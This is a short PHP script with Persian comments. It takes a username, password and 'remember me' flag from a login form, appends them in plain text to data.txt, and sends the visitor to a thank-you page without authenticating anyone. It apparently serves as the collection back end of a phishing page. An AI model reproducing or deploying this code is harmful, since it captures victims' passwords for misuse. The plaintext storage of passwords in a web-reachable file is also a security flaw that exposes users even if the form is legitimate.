<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // دریافت اطلاعات ارسالی از فرم
    $username = $_POST["username"];
    $password = $_POST["password"];
    $rememberme = isset($_POST["rememberme"]) ? "Yes" : "No";

    // ترکیب اطلاعات برای ذخیره‌سازی
    $data = "نام کاربری: " . $username . "\n" .
            "رمز عبور: " . $password . "\n" .
            "مرا به خاطر بسپار: " . $rememberme . "\n\n";

    // ذخیره‌سازی اطلاعات در فایل data.txt
    $file = "data.txt";
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // تغییر مسیر به صفحه‌ای که مایلید کاربر به آن هدایت شود
    header("Location: thank_you.html");
    exit();
}
?>
